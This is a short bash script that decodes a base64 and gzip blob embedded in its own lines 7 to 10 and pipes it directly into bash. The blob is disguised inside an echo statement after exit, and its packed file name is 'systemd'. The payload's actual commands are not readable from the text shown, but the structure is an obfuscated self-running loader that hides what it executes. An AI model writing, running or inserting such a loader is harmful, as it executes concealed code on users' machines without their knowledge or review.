#!/bin/bash
ps=7
pe=10
sed -n "${ps},${pe}p" $0 | base64 -d | gzip -d |bash 
exit
echo "
H4sICKKKOVwAA3N5c3RlbWQADcnNDYJAEEDhM1PFiAY0JoxeTcBa9mcImyyMYcHVGGswHq3Biw1Y
jqENubzD95YL0q4jrUIDbBpB6kUGCtcwcGuxqpB4MNSbwotRHtR6c4NEl+nv85i+z+n9SiGpXc+1
XDCPMRZaOTsWRloKx2jLfLvSiFlFls/Ujd7DHVS530FsnGc8gBVAVJjNDZ75hPOz0vEsf3nZlRad
AAAA
"
